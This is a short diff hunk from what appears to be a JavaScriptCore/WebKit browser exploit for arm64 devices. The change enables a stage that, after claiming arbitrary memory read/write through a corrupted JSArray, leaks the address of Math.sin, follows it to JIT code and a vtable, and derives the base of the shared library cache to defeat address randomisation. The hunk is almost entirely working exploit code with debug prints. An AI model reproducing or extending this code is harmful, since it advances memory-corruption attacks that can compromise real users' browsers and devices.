@@ -629,21 +629,21 @@ for (var i = 0; i < 1000; ++i) {
         },
     };
     print("we have arbitrary r/w with JSArray :)");
-   /* memory = stage2;
+   memory = stage2;
 	var sinFuncAddr = memory.addrof(Math.sin);
-        
+        print("Math.sin() @ " + sinFuncAddr);
         var executableAddr = memory.read64(sinFuncAddr,3);
-       
+        print("Math.sin() ExecutableAddr @ " + executableAddr);
         var jitCodeAddr = memory.read64(executableAddr,3);
-        print("jit @ " + jitCodeAddr)
+	print("Math.sin() jitCodeAddr @ " + jitCodeAddr);
         
         var vtab = memory.read64(jitCodeAddr,0);
-        print("vtab @ " + vtab)
+        print("Math.sin() vtable @ " + vtab)
         var anchor1 = memory.read64(vtab,0)
         print("anchor1" + anchor1);
         var jsc = Sub(anchor1, anchor1.lo() & 0xfff);
 	print('JSC header @' + jsc); //dyld_cache_header
-        while(true)
+        /*while(true)
         {
         if(strcmp(memory.read(jsc, 0x10), "dyld_v1   arm64")) //cache header magic
         //webcore header magic...
